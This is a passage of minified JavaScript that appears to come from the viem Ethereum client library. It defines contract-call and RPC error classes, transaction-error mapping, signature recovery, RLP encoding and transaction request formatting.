            metaMessages: [...t.metaMessages ? [...t.metaMessages, " "] : [], "Raw Call Arguments:", m].filter(Boolean),
            name: "CallExecutionError"
        }), Object.defineProperty(this, "cause", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.cause = t
    }
}
class Jb extends F {
    constructor(t, {
        abi: n,
        args: r,
        contractAddress: s,
        docsPath: i,
        functionName: o,
        sender: a
    }) {
        const c = ps({
                abi: n,
                args: r,
                name: o
            }),
            u = c ? qb({
                abiItem: c,
                args: r,
                includeFunctionName: !1,
                includeName: !1
            }) : void 0,
            l = c ? Jt(c, {
                includeName: !0
            }) : void 0,
            f = Qo({
                address: s && A4(s),
                function: l,
                args: u && u !== "()" && `${[...Array(o?.length??0).keys()].map(()=>" ").join("")}${u}`,
                sender: a
            });
        super(t.shortMessage || `An unknown error occurred while executing the contract function "${o}".`, {
            cause: t,
            docsPath: i,
            metaMessages: [...t.metaMessages ? [...t.metaMessages, " "] : [], f && "Contract Call:", f].filter(Boolean),
            name: "ContractFunctionExecutionError"
        }), Object.defineProperty(this, "abi", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "args", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "cause", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "contractAddress", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "formattedArgs", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "functionName", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "sender", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.abi = n, this.args = r, this.cause = t, this.contractAddress = s, this.functionName = o, this.sender = a
    }
}
class Kn extends F {
    constructor({
        abi: t,
        data: n,
        functionName: r,
        message: s
    }) {
        let i, o, a, c;
        if (n && n !== "0x") try {
            o = w4({
                abi: t,
                data: n
            });
            const {
                abiItem: l,
                errorName: f,
                args: d
            } = o;
            if (f === "Error") c = d[0];
            else if (f === "Panic") {
                const [h] = d;
                c = o4[h]
            } else {
                const h = l ? Jt(l, {
                        includeName: !0
                    }) : void 0,
                    b = l && d ? qb({
                        abiItem: l,
                        args: d,
                        includeFunctionName: !1,
                        includeName: !1
                    }) : void 0;
                a = [h ? `Error: ${h}` : "", b && b !== "()" ? `       ${[...Array(f?.length??0).keys()].map(()=>" ").join("")}${b}` : ""]
            }
        } catch (l) {
            i = l
        } else s && (c = s);
        let u;
        i instanceof _b && (u = i.signature, a = [`Unable to decode signature "${u}" as it was not found on the provided ABI.`, "Make sure you are using the correct ABI and that the error exists on it.", `You can look up the decoded signature here: https://openchain.xyz/signatures?query=${u}.`]), super(c && c !== "execution reverted" || u ? [`The contract function "${r}" reverted with the following ${u?"signature":"reason"}:`, c || u].join(`
`) : `The contract function "${r}" reverted.`, {
            cause: i,
            metaMessages: a,
            name: "ContractFunctionRevertedError"
        }), Object.defineProperty(this, "data", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "raw", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "reason", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "signature", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.data = o, this.raw = n, this.reason = c, this.signature = u
    }
}
class N4 extends F {
    constructor({
        functionName: t
    }) {
        super(`The contract function "${t}" returned no data ("0x").`, {
            metaMessages: ["This could be due to any of the following:", `  - The contract does not have the function "${t}",`, "  - The parameters passed to the contract function may be invalid, or", "  - The address is not a contract."],
            name: "ContractFunctionZeroDataError"
        })
    }
}
class P4 extends F {
    constructor({
        factory: t
    }) {
        super(`Deployment for counterfactual contract call failed${t?` for factory "${t}".`:""}`, {
            metaMessages: ["Please ensure:", "- The `factory` is a valid contract deployment factory (ie. Create2 Factory, ERC-4337 Factory, etc).", "- The `factoryData` is a valid encoded function call for contract deployment function on the factory."],
            name: "CounterfactualDeploymentFailedError"
        })
    }
}
class hl extends F {
    constructor({
        data: t,
        message: n
    }) {
        super(n || "", {
            name: "RawContractError"
        }), Object.defineProperty(this, "code", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: 3
        }), Object.defineProperty(this, "data", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.data = t
    }
}
class Hi extends F {
    constructor({
        body: t,
        cause: n,
        details: r,
        headers: s,
        status: i,
        url: o
    }) {
        super("HTTP request failed.", {
            cause: n,
            details: r,
            metaMessages: [i && `Status: ${i}`, `URL: ${Vf(o)}`, t && `Request body: ${Be(t)}`].filter(Boolean),
            name: "HttpRequestError"
        }), Object.defineProperty(this, "body", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "headers", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "status", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "url", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.body = t, this.headers = s, this.status = i, this.url = o
    }
}
class Hf extends F {
    constructor({
        body: t,
        error: n,
        url: r
    }) {
        super("RPC Request failed.", {
            cause: n,
            details: n.message,
            metaMessages: [`URL: ${Vf(r)}`, `Request body: ${Be(t)}`],
            name: "RpcRequestError"
        }), Object.defineProperty(this, "code", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "data", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "url", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.code = n.code, this.data = n.data, this.url = r
    }
}
class rp extends F {
    constructor({
        body: t,
        url: n
    }) {
        super("The request took too long to respond.", {
            details: "The request timed out.",
            metaMessages: [`URL: ${Vf(n)}`, `Request body: ${Be(t)}`],
            name: "TimeoutError"
        }), Object.defineProperty(this, "url", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.url = n
    }
}
const O4 = -1;
class St extends F {
    constructor(t, {
        code: n,
        docsPath: r,
        metaMessages: s,
        name: i,
        shortMessage: o
    }) {
        super(o, {
            cause: t,
            docsPath: r,
            metaMessages: s || t?.metaMessages,
            name: i || "RpcError"
        }), Object.defineProperty(this, "code", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.name = i || t.name, this.code = t instanceof Hf ? t.code : n ?? O4
    }
}
class Lt extends St {
    constructor(t, n) {
        super(t, n), Object.defineProperty(this, "data", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.data = n.data
    }
}
class lo extends St {
    constructor(t) {
        super(t, {
            code: lo.code,
            name: "ParseRpcError",
            shortMessage: "Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."
        })
    }
}
Object.defineProperty(lo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32700
});
class uo extends St {
    constructor(t) {
        super(t, {
            code: uo.code,
            name: "InvalidRequestRpcError",
            shortMessage: "JSON is not a valid request object."
        })
    }
}
Object.defineProperty(uo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32600
});
class fo extends St {
    constructor(t, {
        method: n
    } = {}) {
        super(t, {
            code: fo.code,
            name: "MethodNotFoundRpcError",
            shortMessage: `The method${n?` "${n}"`:""} does not exist / is not available.`
        })
    }
}
Object.defineProperty(fo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32601
});
class ho extends St {
    constructor(t) {
        super(t, {
            code: ho.code,
            name: "InvalidParamsRpcError",
            shortMessage: ["Invalid parameters were provided to the RPC method.", "Double check you have provided the correct parameters."].join(`
`)
        })
    }
}
Object.defineProperty(ho, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32602
});
class is extends St {
    constructor(t) {
        super(t, {
            code: is.code,
            name: "InternalRpcError",
            shortMessage: "An internal error was received."
        })
    }
}
Object.defineProperty(is, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32603
});
class Er extends St {
    constructor(t) {
        super(t, {
            code: Er.code,
            name: "InvalidInputRpcError",
            shortMessage: ["Missing or invalid parameters.", "Double check you have provided the correct parameters."].join(`
`)
        })
    }
}
Object.defineProperty(Er, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32e3
});
class po extends St {
    constructor(t) {
        super(t, {
            code: po.code,
            name: "ResourceNotFoundRpcError",
            shortMessage: "Requested resource not found."
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "ResourceNotFoundRpcError"
        })
    }
}
Object.defineProperty(po, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32001
});
class mo extends St {
    constructor(t) {
        super(t, {
            code: mo.code,
            name: "ResourceUnavailableRpcError",
            shortMessage: "Requested resource not available."
        })
    }
}
Object.defineProperty(mo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32002
});
class bo extends St {
    constructor(t) {
        super(t, {
            code: bo.code,
            name: "TransactionRejectedRpcError",
            shortMessage: "Transaction creation failed."
        })
    }
}
Object.defineProperty(bo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32003
});
class Fr extends St {
    constructor(t, {
        method: n
    } = {}) {
        super(t, {
            code: Fr.code,
            name: "MethodNotSupportedRpcError",
            shortMessage: `Method${n?` "${n}"`:""} is not supported.`
        })
    }
}
Object.defineProperty(Fr, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32004
});
class ti extends St {
    constructor(t) {
        super(t, {
            code: ti.code,
            name: "LimitExceededRpcError",
            shortMessage: "Request exceeds defined limit."
        })
    }
}
Object.defineProperty(ti, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32005
});
class go extends St {
    constructor(t) {
        super(t, {
            code: go.code,
            name: "JsonRpcVersionUnsupportedError",
            shortMessage: "Version of JSON-RPC protocol is not supported."
        })
    }
}
Object.defineProperty(go, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: -32006
});
class Ls extends Lt {
    constructor(t) {
        super(t, {
            code: Ls.code,
            name: "UserRejectedRequestError",
            shortMessage: "User rejected the request."
        })
    }
}
Object.defineProperty(Ls, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 4001
});
class xo extends Lt {
    constructor(t) {
        super(t, {
            code: xo.code,
            name: "UnauthorizedProviderError",
            shortMessage: "The requested method and/or account has not been authorized by the user."
        })
    }
}
Object.defineProperty(xo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 4100
});
class yo extends Lt {
    constructor(t, {
        method: n
    } = {}) {
        super(t, {
            code: yo.code,
            name: "UnsupportedProviderMethodError",
            shortMessage: `The Provider does not support the requested method${n?` " ${n}"`:""}.`
        })
    }
}
Object.defineProperty(yo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 4200
});
class wo extends Lt {
    constructor(t) {
        super(t, {
            code: wo.code,
            name: "ProviderDisconnectedError",
            shortMessage: "The Provider is disconnected from all chains."
        })
    }
}
Object.defineProperty(wo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 4900
});
class _o extends Lt {
    constructor(t) {
        super(t, {
            code: _o.code,
            name: "ChainDisconnectedError",
            shortMessage: "The Provider is not connected to the requested chain."
        })
    }
}
Object.defineProperty(_o, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 4901
});
class Eo extends Lt {
    constructor(t) {
        super(t, {
            code: Eo.code,
            name: "SwitchChainError",
            shortMessage: "An error occurred when attempting to switch chain."
        })
    }
}
Object.defineProperty(Eo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 4902
});
class ni extends Lt {
    constructor(t) {
        super(t, {
            code: ni.code,
            name: "UnsupportedNonOptionalCapabilityError",
            shortMessage: "This Wallet does not support a capability that was not marked as optional."
        })
    }
}
Object.defineProperty(ni, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 5700
});
class vo extends Lt {
    constructor(t) {
        super(t, {
            code: vo.code,
            name: "UnsupportedChainIdError",
            shortMessage: "This Wallet does not support the requested chain ID."
        })
    }
}
Object.defineProperty(vo, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 5710
});
class To extends Lt {
    constructor(t) {
        super(t, {
            code: To.code,
            name: "DuplicateIdError",
            shortMessage: "There is already a bundle submitted with this ID."
        })
    }
}
Object.defineProperty(To, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 5720
});
class So extends Lt {
    constructor(t) {
        super(t, {
            code: So.code,
            name: "UnknownBundleIdError",
            shortMessage: "This bundle id is unknown / has not been submitted"
        })
    }
}
Object.defineProperty(So, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 5730
});
class Co extends Lt {
    constructor(t) {
        super(t, {
            code: Co.code,
            name: "BundleTooLargeError",
            shortMessage: "The call bundle is too large for the Wallet to process."
        })
    }
}
Object.defineProperty(Co, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 5740
});
class Io extends Lt {
    constructor(t) {
        super(t, {
            code: Io.code,
            name: "AtomicReadyWalletRejectedUpgradeError",
            shortMessage: "The Wallet can support atomicity after an upgrade, but the user rejected the upgrade."
        })
    }
}
Object.defineProperty(Io, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 5750
});
class ri extends Lt {
    constructor(t) {
        super(t, {
            code: ri.code,
            name: "AtomicityNotSupportedError",
            shortMessage: "The wallet does not support atomic execution but the request requires it."
        })
    }
}
Object.defineProperty(ri, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 5760
});
class R4 extends St {
    constructor(t) {
        super(t, {
            name: "UnknownRpcError",
            shortMessage: "An unknown RPC error occurred."
        })
    }
}
const M4 = 3;

function os(e, {
    abi: t,
    address: n,
    args: r,
    docsPath: s,
    functionName: i,
    sender: o
}) {
    const a = e instanceof hl ? e : e instanceof F ? e.walk(b => "data" in b) || e.walk() : {},
        {
            code: c,
            data: u,
            details: l,
            message: f,
            shortMessage: d
        } = a,
        h = e instanceof Xo ? new N4({
            functionName: i
        }) : [M4, is.code].includes(c) && (u || l || f || d) || c === Er.code && l === "execution reverted" && u ? new Kn({
            abi: t,
            data: typeof u == "object" ? u.data : u,
            functionName: i,
            message: a instanceof Hf ? l : d ?? f
        }) : e;
    return new Jb(h, {
        abi: t,
        args: r,
        contractAddress: n,
        docsPath: s,
        functionName: i,
        sender: o
    })
}

function k4(e) {
    const t = We(`0x${e.substring(4)}`).substring(26);
    return Ko(`0x${t}`)
}
const B4 = "modulepreload",
    L4 = function(e) {
        return "/" + e
    },
    sp = {},
    Qb = function(t, n, r) {
        let s = Promise.resolve();
        if (n && n.length > 0) {
            let c = function(u) {
                return Promise.all(u.map(l => Promise.resolve(l).then(f => ({
                    status: "fulfilled",
                    value: f
                }), f => ({
                    status: "rejected",
                    reason: f
                }))))
            };
            document.getElementsByTagName("link");
            const o = document.querySelector("meta[property=csp-nonce]"),
                a = o?.nonce || o?.getAttribute("nonce");
            s = c(n.map(u => {
                if (u = L4(u), u in sp) return;
                sp[u] = !0;
                const l = u.endsWith(".css"),
                    f = l ? '[rel="stylesheet"]' : "";
                if (document.querySelector(`link[href="${u}"]${f}`)) return;
                const d = document.createElement("link");
                if (d.rel = l ? "stylesheet" : B4, l || (d.as = "script"), d.crossOrigin = "", d.href = u, a && d.setAttribute("nonce", a), document.head.appendChild(d), l) return new Promise((h, b) => {
                    d.addEventListener("load", h), d.addEventListener("error", () => b(new Error(`Unable to preload CSS for ${u}`)))
                })
            }))
        }

        function i(o) {
            const a = new Event("vite:preloadError", {
                cancelable: !0
            });
            if (a.payload = o, window.dispatchEvent(a), !a.defaultPrevented) throw o
        }
        return s.then(o => {
            for (const a of o || []) a.status === "rejected" && i(a.reason);
            return t().catch(i)
        })
    };
async function $4({
    hash: e,
    signature: t
}) {
    const n = bn(e) ? e : Xn(e),
        {
            secp256k1: r
        } = await Qb(async () => {
            const {
                secp256k1: o
            } = await Promise.resolve().then(() => uS);
            return {
                secp256k1: o
            }
        }, void 0);
    return `0x${(()=>{if(typeof t=="object"&&"r"in t&&"s"in t){const{r:u,s:l,v:f,yParity:d}=t,h=Number(d??f),b=ip(h);return new r.Signature(Mt(u),Mt(l)).addRecoveryBit(b)}const o=bn(t)?t:Xn(t);if(Ie(o)!==65)throw new Error("invalid signature length");const a=Qt(`
    0x $ {
        o.slice(130)
    }
    `),c=ip(a);return r.Signature.fromCompact(o.substring(2,130)).addRecoveryBit(c)})().recoverPublicKey(n.substring(2)).toHex(!1)}`
}

function ip(e) {
    if (e === 0 || e === 1) return e;
    if (e === 27) return 0;
    if (e === 28) return 1;
    throw new Error("Invalid yParityOrV value")
}
async function eg({
    hash: e,
    signature: t
}) {
    return k4(await $4({
        hash: e,
        signature: t
    }))
}

function D4(e, t = "hex") {
    const n = tg(e),
        r = Uf(new Uint8Array(n.length));
    return n.encode(r), t === "hex" ? Le(r.bytes) : r.bytes
}

function tg(e) {
    return Array.isArray(e) ? F4(e.map(t => tg(t))) : U4(e)
}

function F4(e) {
    const t = e.reduce((s, i) => s + i.length, 0),
        n = ng(t);
    return {
        length: t <= 55 ? 1 + t : 1 + n + t,
        encode(s) {
            t <= 55 ? s.pushByte(192 + t) : (s.pushByte(247 + n), n === 1 ? s.pushUint8(t) : n === 2 ? s.pushUint16(t) : n === 3 ? s.pushUint24(t) : s.pushUint32(t));
            for (const {
                    encode: i
                }
                of e) i(s)
        }
    }
}

function U4(e) {
    const t = typeof e == "string" ? gn(e) : e,
        n = ng(t.length);
    return {
        length: t.length === 1 && t[0] < 128 ? 1 : t.length <= 55 ? 1 + t.length : 1 + n + t.length,
        encode(s) {
            t.length === 1 && t[0] < 128 ? s.pushBytes(t) : t.length <= 55 ? (s.pushByte(128 + t.length), s.pushBytes(t)) : (s.pushByte(183 + n), n === 1 ? s.pushUint8(t.length) : n === 2 ? s.pushUint16(t.length) : n === 3 ? s.pushUint24(t.length) : s.pushUint32(t.length), s.pushBytes(t))
        }
    }
}

function ng(e) {
    if (e < 2 ** 8) return 1;
    if (e < 2 ** 16) return 2;
    if (e < 2 ** 24) return 3;
    if (e < 2 ** 32) return 4;
    throw new F("Length is too large.")
}

function V4(e) {
    const {
        chainId: t,
        nonce: n,
        to: r
    } = e, s = e.contractAddress ?? e.address, i = We(hi(["0x05", D4([t ? J(t) : "0x", s, n ? J(n) : "0x"])]));
    return r === "bytes" ? gn(i) : i
}
async function pl(e) {
    const {
        authorization: t,
        signature: n
    } = e;
    return eg({
        hash: V4(t),
        signature: n ?? t
    })
}
class H4 extends F {
    constructor(t, {
        account: n,
        docsPath: r,
        chain: s,
        data: i,
        gas: o,
        gasPrice: a,
        maxFeePerGas: c,
        maxPriorityFeePerGas: u,
        nonce: l,
        to: f,
        value: d
    }) {
        const h = Qo({
            from: n?.address,
            to: f,
            value: typeof d < "u" && `${Un(d)} ${s?.nativeCurrency?.symbol||"ETH"}`,
            data: i,
            gas: o,
            gasPrice: typeof a < "u" && `${Et(a)} gwei`,
            maxFeePerGas: typeof c < "u" && `${Et(c)} gwei`,
            maxPriorityFeePerGas: typeof u < "u" && `${Et(u)} gwei`,
            nonce: l
        });
        super(t.shortMessage, {
            cause: t,
            docsPath: r,
            metaMessages: [...t.metaMessages ? [...t.metaMessages, " "] : [], "Estimate Gas Arguments:", h].filter(Boolean),
            name: "EstimateGasExecutionError"
        }), Object.defineProperty(this, "cause", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.cause = t
    }
}
class Cs extends F {
    constructor({
        cause: t,
        message: n
    } = {}) {
        const r = n?.replace("execution reverted: ", "")?.replace("execution reverted", "");
        super(`Execution reverted ${r?`with reason: ${r}`:"for an unknown reason"}.`, {
            cause: t,
            name: "ExecutionRevertedError"
        })
    }
}
Object.defineProperty(Cs, "code", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: 3
});
Object.defineProperty(Cs, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /execution reverted/
});
class uc extends F {
    constructor({
        cause: t,
        maxFeePerGas: n
    } = {}) {
        super(`The fee cap (\`maxFeePerGas\`${n?` = ${Et(n)} gwei`:""}) cannot be higher than the maximum allowed value (2^256-1).`, {
            cause: t,
            name: "FeeCapTooHighError"
        })
    }
}
Object.defineProperty(uc, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /max fee per gas higher than 2\^256-1|fee cap higher than 2\^256-1/
});
class Wu extends F {
    constructor({
        cause: t,
        maxFeePerGas: n
    } = {}) {
        super(`The fee cap (\`maxFeePerGas\`${n?` = ${Et(n)}`:""} gwei) cannot be lower than the block base fee.`, {
            cause: t,
            name: "FeeCapTooLowError"
        })
    }
}
Object.defineProperty(Wu, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /max fee per gas less than block base fee|fee cap less than block base fee|transaction is outdated/
});
class Xu extends F {
    constructor({
        cause: t,
        nonce: n
    } = {}) {
        super(`Nonce provided for the transaction ${n?`(${n}) `:""}is higher than the next one expected.`, {
            cause: t,
            name: "NonceTooHighError"
        })
    }
}
Object.defineProperty(Xu, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /nonce too high/
});
class Ku extends F {
    constructor({
        cause: t,
        nonce: n
    } = {}) {
        super([`Nonce provided for the transaction ${n?`(${n}) `:""}is lower than the current nonce of the account.`, "Try increasing the nonce or find the latest nonce with `getTransactionCount`."].join(`
`), {
            cause: t,
            name: "NonceTooLowError"
        })
    }
}
Object.defineProperty(Ku, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /nonce too low|transaction already imported|already known/
});
class Zu extends F {
    constructor({
        cause: t,
        nonce: n
    } = {}) {
        super(`Nonce provided for the transaction ${n?`(${n}) `:""}exceeds the maximum allowed nonce.`, {
            cause: t,
            name: "NonceMaxValueError"
        })
    }
}
Object.defineProperty(Zu, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /nonce has max value/
});
class Yu extends F {
    constructor({
        cause: t
    } = {}) {
        super(["The total cost (gas * gas fee + value) of executing this transaction exceeds the balance of the account."].join(`
`), {
            cause: t,
            metaMessages: ["This error could arise when the account does not have enough funds to:", " - pay for the total gas fee,", " - pay for the value to send.", " ", "The cost of the transaction is calculated as `gas * gas fee + value`, where:", " - `gas` is the amount of gas needed for transaction to execute,", " - `gas fee` is the gas fee,", " - `value` is the amount of ether to send to the recipient."],
            name: "InsufficientFundsError"
        })
    }
}
Object.defineProperty(Yu, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /insufficient funds|exceeds transaction sender account balance/
});
class Ju extends F {
    constructor({
        cause: t,
        gas: n
    } = {}) {
        super(`The amount of gas ${n?`(${n}) `:""}provided for the transaction exceeds the limit allowed for the block.`, {
            cause: t,
            name: "IntrinsicGasTooHighError"
        })
    }
}
Object.defineProperty(Ju, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /intrinsic gas too high|gas limit reached/
});
class Qu extends F {
    constructor({
        cause: t,
        gas: n
    } = {}) {
        super(`The amount of gas ${n?`(${n}) `:""}provided for the transaction is too low.`, {
            cause: t,
            name: "IntrinsicGasTooLowError"
        })
    }
}
Object.defineProperty(Qu, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /intrinsic gas too low/
});
class e0 extends F {
    constructor({
        cause: t
    }) {
        super("The transaction type is not supported for this chain.", {
            cause: t,
            name: "TransactionTypeNotSupportedError"
        })
    }
}
Object.defineProperty(e0, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /transaction type not valid/
});
class fc extends F {
    constructor({
        cause: t,
        maxPriorityFeePerGas: n,
        maxFeePerGas: r
    } = {}) {
        super([`The provided tip (\`maxPriorityFeePerGas\`${n?` = ${Et(n)} gwei`:""}) cannot be higher than the fee cap (\`maxFeePerGas\`${r?` = ${Et(r)} gwei`:""}).`].join(`
`), {
            cause: t,
            name: "TipAboveFeeCapError"
        })
    }
}
Object.defineProperty(fc, "nodeMessage", {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: /max priority fee per gas higher than max fee per gas|tip higher than fee cap/
});
class ea extends F {
    constructor({
        cause: t
    }) {
        super(`An error occurred while executing: ${t?.shortMessage}`, {
            cause: t,
            name: "UnknownNodeError"
        })
    }
}

function ml(e, t) {
    const n = (e.details || "").toLowerCase(),
        r = e instanceof F ? e.walk(s => s?.code === Cs.code) : e;
    return r instanceof F ? new Cs({
        cause: e,
        message: r.details
    }) : Cs.nodeMessage.test(n) ? new Cs({
        cause: e,
        message: e.details
    }) : uc.nodeMessage.test(n) ? new uc({
        cause: e,
        maxFeePerGas: t?.maxFeePerGas
    }) : Wu.nodeMessage.test(n) ? new Wu({
        cause: e,
        maxFeePerGas: t?.maxFeePerGas
    }) : Xu.nodeMessage.test(n) ? new Xu({
        cause: e,
        nonce: t?.nonce
    }) : Ku.nodeMessage.test(n) ? new Ku({
        cause: e,
        nonce: t?.nonce
    }) : Zu.nodeMessage.test(n) ? new Zu({
        cause: e,
        nonce: t?.nonce
    }) : Yu.nodeMessage.test(n) ? new Yu({
        cause: e
    }) : Ju.nodeMessage.test(n) ? new Ju({
        cause: e,
        gas: t?.gas
    }) : Qu.nodeMessage.test(n) ? new Qu({
        cause: e,
        gas: t?.gas
    }) : e0.nodeMessage.test(n) ? new e0({
        cause: e
    }) : fc.nodeMessage.test(n) ? new fc({
        cause: e,
        maxFeePerGas: t?.maxFeePerGas,
        maxPriorityFeePerGas: t?.maxPriorityFeePerGas
    }) : new ea({
        cause: e
    })
}

function j4(e, {
    docsPath: t,
    ...n
}) {
    const r = (() => {
        const s = ml(e, n);
        return s instanceof ea ? e : s
    })();
    return new H4(r, {
        docsPath: t,
        ...n
    })
}

function pi(e, {
    format: t
}) {
    if (!t) return {};
    const n = {};

    function r(i) {
        const o = Object.keys(i);
        for (const a of o) a in e && (n[a] = e[a]), i[a] && typeof i[a] == "object" && !Array.isArray(i[a]) && r(i[a])
    }
    const s = t(e || {});
    return r(s), n
}
const z4 = {
    legacy: "0x0",
    eip2930: "0x1",
    eip1559: "0x2",
    eip4844: "0x3",
    eip7702: "0x4"
};

function Cr(e, t) {
    const n = {};
    return typeof e.authorizationList < "u" && (n.authorizationList = q4(e.authorizationList)), typeof e.accessList < "u" && (n.accessList = e.accessList), typeof e.blobVersionedHashes < "u" && (n.blobVersionedHashes = e.blobVersionedHashes), typeof e.blobs < "u" && (typeof e.blobs[0] != "string" ? n.blobs = e.blobs.map(r => Le(r)) : n.blobs = e.blobs), typeof e.data < "u" && (n.data = e.data), e.account && (n.from = e.account.address), typeof e.from < "u" && (n.from = e.from), typeof e.gas < "u" && (n.gas = J(e.gas)), typeof e.gasPrice < "u" && (n.gasPrice = J(e.gasPrice)), typeof e.maxFeePerBlobGas < "u" && (n.maxFeePerBlobGas = J(e.maxFeePerBlobGas)), typeof e.maxFeePerGas < "u" && (n.maxFeePerGas = J(e.maxFeePerGas)), typeof e.maxPriorityFeePerGas < "u" && (n.maxPriorityFeePerGas = J(e.maxPriorityFeePerGas)), typeof e.nonce < "u" && (n.nonce = J(e.nonce)), typeof e.to < "u" && (n.to = e.to), typeof e.type < "u" && (n.type = z4[e.type]), typeof e.value < "u" && (n.value = J(e.value)), n
}

function q4(e) {
    return e.map(t => ({
        address: t.address,
        r: t.r ? J(BigInt(t.r)) : t.r,
        s: t.s ? J(BigInt(t.s)) : t.s,
        chainId: J(t.chainId),
        nonce: J(t.nonce),
        ...typeof t.yParity < "u" ? {
            yParity: J(t.yParity)
        } : {},
        ...typeof t.v < "u" && typeof t.yParity > "u" ? {
            v: J(t.v)
        } : {}
    }))
}

function op(e) {
    if (!(!e || e.length === 0)) return e.reduce((t, {
        slot: n,
        value: r
    }) => {
        if (n.length !== 66) throw new qh({
            size: n.length,
            targetSize: 66,
            type: "hex"
        });
        if (r.length !== 66) throw new qh({
            size: r.length,
            targetSize: 66,
            type: "hex"
        });
        return t[n] = r, t
    }, {})
}

function G4(e) {
    const {
        balance: t,
        nonce: n,
        state: r,
        stateDiff: s,
        code: i
    } = e, o = {};
    if (i !== void 0 && (o.code = i), t !== void 0 && (o.balance = J(t)), n !== void 0 && (o.nonce = J(n)), r !== void 0 && (o.state = op(r)), s !== void 0) {
        if (o.state) throw new v4;
        o.stateDiff = op(s)
    }
    return o
}

function jf(e) {
    if (!e) return;
    const t = {};
    for (const {
            address: n,
            ...r
        }
        of e) {
        if (!zt(n, {
                strict: !1
            })) throw new _r({
            address: n
        });
        if (t[n]) throw new E4({
            address: n
        });
        t[n] = G4(r)
    }
    return t
}
const rg = 2n ** 256n - 1n;

function nr(e) {
    const {
        account: t,
        maxFeePerGas: n,
        maxPriorityFeePerGas: r,
        to: s
    } = e, i = t ? Se(t) : void 0;
    if (i && !zt(i.address)) throw new _r({
        address: i.address
    });
    if (s && !zt(s)) throw new _r({
        address: s
    });
    if (n && n > rg) throw new uc({
        maxFeePerGas: n
    });
    if (r && n && r > n) throw new fc({
        maxFeePerGas: n,
